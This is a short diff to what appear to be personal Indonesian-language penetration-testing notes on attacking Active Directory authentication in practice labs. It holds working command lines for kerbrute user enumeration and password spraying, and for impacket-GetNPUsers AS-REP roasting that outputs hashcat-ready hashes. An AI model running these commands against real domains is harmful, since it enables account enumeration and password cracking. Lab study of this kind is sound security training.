@@ -1224,6 +1224,9 @@ Ketiga, kita bisa menggunakan kerbrute yang dimana tools ini menggunakan TGT dan
 ./kerbrute passwordspray -d corp.com --dc 192.168.106.70  ~/oscp/attacking-active-directory-authentication/user.txt 'Nexus123!'
 
 
+//untuk enum user saja
+kerbrute userenum -d vulnnet-rst.local --dc 10.48.166.9 test.txt 
+
 //windows 
 
 ./kerbrute_windows_amd64.exe passwordspray -d corp.com user.txt 'Nexus123!'
@@ -1242,6 +1245,9 @@ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hash.asrep corp.c
 
 //no save to file
 impacket-GetNPUsers -dc-ip 192.168.106.70 -request corp.com/pete
+
+//using file
+impacket-GetNPUsers -request -dc-ip 10.48.166.9 vulnnet-rst.local/ -usersfile user.txt -format hashcat
 
 ```
 
